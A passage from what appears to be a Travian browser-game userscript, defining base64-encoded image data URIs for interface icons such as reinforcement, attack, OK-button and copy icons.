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';
	//reinforcements (ne peut etre supprimer)
	imagenes["def1"] = 'data:image/gif;base64,R0lGODlhEAAQAPcAAP///xprJU5MlAd1CBRwGDY0Zgx5BfTy8g52DE9VlGN+Xwx6BRR0Gy0rVWObQzAuW0hGeBFzE0lHijteQAZ0CBJ1FChoQRNYKydmQUhHijw6fDc1ZxVxGRZ4HFBQnBpsJQ9PGT8/gEdFjluSQt3b3Pn1+JOclFmTQd2/NUVLjQdpBbu5vTU0aOnn6UZLhU9VlTw7bwp5BDp2SK63rRRxGdzZ3CBoOz16R9rAM3+OVf38/rm5vAxuFlRZnjEwXkREjhNWEg9kHBZQHhBSCzg2ahp+DEVEg0VDgtLU0E1MlTI0brW1txpTMwt4DBB4DlpaazFjMqKRZCFmNktRjRN6E1+YPXF0T0JIhufl5whcD8TExhNwGF5flnh8S2uAM/f29BttJxN0FiYlSYiOijd1O01Tkd6+LBeAG09NZ01SkQt4BA11DCsrVjc1ZgRzBklHi3eMISJnNUtJjmNhd8y7Menm6LScV05Tkbq4vBxrLU5MlQtNG36QexZvIBpULx5mMydnP2GDHBtiNhF1EwZOEkpIZA9SHkJGiEJDhQdYFK6zr2pvr0lNkAd0Ci5bLkZFiImYhcnIyubFUTk4avfy95OVlx9FJn10hyBsMRtpLiRpORV0GhBFHyJiPEJDgaCpnURGghBzEwFoA1NZnQp1Dk5NlQp3BS0sXG2DbV9hdUdWUgNJACxxNh1oPjQxYF2ZSRdwIoCrQgVzBm2HbZaLgkdFd0lPiZKdk7KytztAcmVqrSNjOnxyXlNQbzSCFEpJjSRoOfz9+zAuWbakektJjUtLnB1/IhtoLa6VYF2XQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAQAj/AHeIaSDsgQ9XBWpBILKhTYFTTwCYyDIoQhgHZuB0CFWBx4QSALRMevTjUhRakuwMQ+ZBTxIYkQAAwOIoyIcAOMEkUqBDJoAZKmKoMdVIlhsKAwYYMLBA1Kw6lv7EkSLoBg4vrWwA03QBlcwvhUJIyHAoBaNfxBD1OuDTZyVOsPrsUUWiLQBcuVzYmlLmRQ9di0YluJPmSipFfnZ1khGryqtkJ0ZYwACIya0aQJqsKULFGJ1AZ3w5QUAKCqVgczS8kSOCCwpexQQIKMVihUwkQvIcY5XDShcymTAZ+tR2DKFNHAgQ2EKDAYgldgHgYePJyBFQStC0iO4T0qohfNjaAg0IADs=';
	imagenes["def2"] = 'data:image/gif;base64,R0lGODlhEAAQAPcAAP///924GMqqJffNCEpLlfjOBbicNjIzZvHy8ubBE6qkhTMzZvDJDkVGi0VFiubAE/bMBkpLlKWJHlpXkfnQBN++G+Tl6frQBUVGjkdHjcurJc2tJ2hiUufCFFVTieTIHPTRIkBCV8KnLd25GUNDd4RyHLa3vbm5vKailJ2DG9G4SbS1vEpLZykpVdS0IEZEcsSoMfDIDJuAANKyFOPl6EVEgXZoIefDE2RjdWBhekRFeP39+7ecNZ2UbcauQXZ0r7m3r863QzEyaPjNCJqDM56KMrqiSE9NhllZa1pYkVdWkLafO15YT01Ob459LqqPK5+GC/7//76nR7iYFElKlEJCg8WtPXFvrZeAL01JMV9ggl9dnebCFjQ1aod5QIF4VfDy+Pn6/khHgr+lNt++GvfYG+7HDPbNCiIjSTU2ajMzZ9XU0KWIEv3+//XOE72hO7CYQVlXkdbY3FJSnJaWl0lJjbmeObSxnaOKEtja3MG+rbqgOd65GTY1bi0uXtW3Ik5NiPXLBiorVrOyt+Lj5zExLMKfD8KrQue8A8TExjAwYDg4fCwtW3RoMz9CYGBbS0JDiN23BZWSiq6WOjg5b1xZlb2oPj49M3NkJkdHjlJTnCwsWUtLlUZHjvfMBa6VPJqAGfjOBIZwH0BCUTU1NUJBXsbHyqikk8KlLfDNDFJQhZ6TX2BenqWbbaafe/b29EZGZOG7FkJCgkNDhfHJDsKmLreeM8uyQ1tZlLW1tykqXFZXhz4+gFhVjV9gd0ZGilVUjV1dlrKZQe3u95Z+HsSnHE9QZLGaP7yoQvDHDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAQAj/AE+gabGJkR9FB0jo6KJmwQFdSACgMHTjAZcghWx8SNAhlhcwABKlgYRhlzEto0LkcKSJAAFKpgAAIOSkmAYBODdMWRVGJgA9kSiE8nQGQqABQwYUKHABUSsamGzxMGBAyqVGlt7Y2fOkRxsAr2DxcvALEDAldTLMaoLAp086ov64SMEhj1sAg16o8tArSSVWV35swTUhzhEcQLBM+mQEmRUVt3wcEgbnGJFTcvCkSmbGDYgsJcrMoBWDQZFhO3wtapCpUzBSpeZQicBJiAmZa4iJQDXmC5NHS2rBkHDHrSQ2ZPgEWD6iAqhcdwGsEFSjiiwxfVhYiC4zigIZUFy1A70bEAA7';
	imagenes["att_all"] = 'data:image/gif;base64,R0lGODlhEAAQAOZ/APT09Lq6ut7e3uKdOP39/bCwsOPj46WlpY+Pj7W1tfv7+8zMzKuGUfb29s/Pz+G6gb29vbmrlpOTk5SUlKmpqZ2dne/v76enp/7+/qiDTuzs7Orj19ra2ubm5s3Nzbi4uNLBqLGxsaGhodTBp9/f37KyspSBZLixp6x4Lefn57OISvDw8KOjo/j4+KaZhqWKYqRvJLe3t3R0dLN/NpiYmMSXU6x2Jf/QiLutl7V5JMTCv/+8WZaWltrSx+3t7c2LKunm4tPT06V4NsOHMczO0deQKtm4h9+gRrOEP/P2+vv49J99Sr+cae3r6MWAHKurq9CXQ8nJyYWFhaKkpf/Je+XayuTo7eDe3eXn6qNzL4V0XNeiVGlRL8Sxle3s6+zZvPbbtaSgmvT086yqqYeIiYFTEuCjS+inSbCys5dvNdXV1drVz4KCgq2mnejo6Ovr68zMzdyPIM25nbqwo5GRke2uUff39vf39/Ly8reRWo2NjYCAgLm5udHR0aioqP///yH5BAEAAH8ALAAAAAAQABAAAAfHgA4hIgl/hoeGAhUUMVILBAt8iIYWFAQaNAJ7QQAeHIgrHw0dEwd/BnpRdx8ChyUAAiwBh24yagoBHngIFik8E5MObBwtCRA+GgWmk399BwINdG8QfhjMhgESJB0IEteHT8oGChXMQEZdcERJZFNYVmgnDz2GG0hZKmAjYToRXw8wZoBAhOPGmR9LGNgYQIWJGERjUAyRo4RLmSob0hTRAsDQnBxO2hiy48XQFSFxTDR5AWVHBmvMXAyowyCDmS0Rvq3Jc6RGIAA7';
	//gradient
	imagenes["c2"] = 'data:image/gif;base64,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';
	//ok button
	imagenes["ok1"] = 'data:image/gif;base64,R0lGODlhMgAUAMQfANHzpLbEoPb/5NH9eo7eLe390tb8iOb+t/L+2979oNv9lLPqa6HkScPwg+j8w9z4se39zKnmWrTwU6nrRr/1X878csf5ap7mOZPhLIrdIYLaGHHQAH/YFMDAwND9dP///yH5BAEAAB8ALAAAAAAyABQAAAX/4Pd1ZGmeaKqunTgGXizP9GDb8Z3jdB8HrQ7M5zMojkeDMblUGAZEGrATrRkSh2w2gd12DwkFtBojkXPXQ0HARjjUAjfcnRiTzef0esPfICACfAV7Gw51Zx54VQMKcHwQCHwIgX6Ub2KIilGMB5QQB4B8lJ5gBoiJHRWqq6yqnJZZo32SYAOtt6skFru8vbyNkYVYwcGzhgO+ybwkFM3Oz84GD8EOD9OSj9QAA9DdziQS4eLj4g0ABYIPDpTU6BsFDw0U5PThJBP4+fr5FOYQkpbcWRPYQMK+g/hIXFjIsCFDBgvMOZj1AMDEDQAs8gHQgIHDjwtJYBhJsmTJCxEWVmRc2UBlxpYsI1wwSXMkiQw4c+rcSQDigp8LIjBIGXToT487k+YkoaGp06dQmxKYOhUnVatVo2ptSiIAh69gw4odS7asWQ5AXpxdy3ZtWhEs4sqdKyIEADs=';
	// Travian: Battle Analyse
	imagenes["imgpack"] = "data:image/gif;base64,R0lGODlhEAAQAOYAAAAAAP////z6/Pz+/Pz+9Pz65Pz67Pz21PTu1Pz23OzGROTSlPzqrPzuvOzivPzyzOzCROS6RNy2TNSyVPzafNS6dOTKhPzilPzinPzmpNzKlOzapPzqtPTmvPzuxPTqzPzy1PTu3Pz25PS+POS2POy+ROS2RNSqRNSuTNy2VPzWdNy+dOTGfOzOhPTWjPzelOzSlOTOlOzWnPzmrPzqvOzevPzuzOy2PPS+ROSyRPzGTOy6TPTCVNyyVNSuVPTKbOS+bNy6bPTOfPzajOzOjPTWlPTerPzmtPTq1OSqNPzCTOy2TNyuVNSqVPTOhOTCfOzKhPTSjPzalNzCjPzirOzatOSqPMyaPNSmVNyyZNy2dOzGhNy6fPTOjOzKjPzanOzWrOzexMyOLMSKLNyeNMySNMyWPOSuVNSmXOS2bNy6hOzavPzqzPz27MyONNSiVOzChOTKpNSiXPzy5MyORMySTOSydNSWVP///wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHgALAAAAAAQABAAAAfqgHiCggMhFk8gA4OLggYbKTIWPgttjHgEDkAxIiJGMys+YAKDHywsCAQENEwuVEVZEx14MBIbSDUaUxVBUkJfVFBYXBMFbDAtQD1mHwc0LypUQ2UpBSBHTkJCZ1QcGCo4JC5mKSIgIDRDP0tDQzo3JTtEZj0iBw82HFI8SiMKJSY5vLhBUe5BAw4zKChQEIGEFStbxJwokMADBwZULvjLkYRMGjhjVnDpkKBBBgwvIHA8s8VOnTd4qjR5YuMBgwsRcnSBc6dOnEFt4lx58sBDFCJyxqiZYwkEFzFEtNDJgsTSojBo5KxRtCgQADs=";
	imagenes["imgpackgo"] = "data:image/gif;base64,R0lGODlhEAAQAOYAAAAAAP///xx6BESSLEyWNFyiRJTChDSGFJzGjCx+BFyePESOHGSiRDyKDESSFDyGDIS2ZJzChKTKjEySHFSaJHSqTIy6bKTGjKzOlFyaLGSeNHyuVKzKlISyXGSeLGyiNHSmPLTOlPz+9Pz65Pz21PTu1Pz23PTmtPzuvPzyzNy2TNSyVNy+ZPzehNS6dOTKhPzinPzmpNzKlOzapPzqtPTmvPzuxPzy1Pz25PS+POy+TNSqRNSuTNy2VPzWdNy+dOTGfOzOhPTWjPzelOzSlOzWnPzqvOzevPzuzOSyROy6TPTCVNyyVNSuVPTKbOS+bPzWfNy6bPTOfPzajOzOjPTWlPTerPzmtPTq1OSyTNyuVNSqVPTOhOTCfOzKhPzalNzCjOTKlPzirMyaPNSmVNyyZNy2dOzGhNy6fPzanOzWrOzexMyOLMSKLMySNMyWPNSmXOzavPzqzNSiXMyORP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHUALAAAAAAQABAAAAffgHWCg3UvXTeEiYJFPUUvTUSKgyxEODhWJz8raolAQCUiIkhaUGJVZWWCRCozWEcyYC5RVVJpYl5kaCsjckRBT0xuSCZGQz4xLW49IzdXXFJSWWI0MD45SUJvPTg3N0ZTTllTUyAaOkpUbkw4JClIRl9LSzkfGxlZXm483CkoNCAfPnjYgKGCgzNsdowwYcNIjA8hMHDgYEECgwNtfqCpwTCGBgwWLEDoACGCggSCtnRBkiKDBAkXEEAwwGABoTBjulCY4KCBApoDJKFhQ8UMnQcFCEgStAbOnDgHBBAKBAA7";
	imagenes["imgcopy"] = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAZiS0dEAHMAaQBai4lpJQAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9ALFw00KOKzIOYAAAF8SURBVHiclZGxjtNAFEWP40UpE4oUKf0HLtLRsGMKFJbGNPGHQLTaBimSRZfPmPQIZavkF7ZyRZEGLU2Q0IR1PGNnKCI7BDsWjDTS09y5590340wmE8uFtVgsnLK21r5sunMFEMdxTZjP5wgh7Gq1cmri3wAAz/POBNd1uf/ymddv3rZCOm30D7d3AAghLo551XSoU8Wnj+/5/mPP1+SBVzfviKJoXepSyuuLCXSqsFqRZ088f/YTu38EIAxD4jhmMBgQBMG6EfCnudCKQ7bD0QqA4XCI53m4rstyuawgnTZzoVOcPKuNOJ1OAQiCYF29QZO50AoO+pRQa2azGdvtliRJGI/HpwRN5iJL6dhjAmMMWmu01nS7XZRSp1943CR8M0/Y/Bc2SyHfccj3kO2w+TFBnucVoNwV4IW4afrNavm+f5bAGENRFEeAlPJaSlkzRVG0DsOQfr+PMaZKUIIqQFvn0WhEr9c761zW/wTYbDY1838lEEK0yfi+z29BFRgySKHeAQAAAABJRU5ErkJggg==";
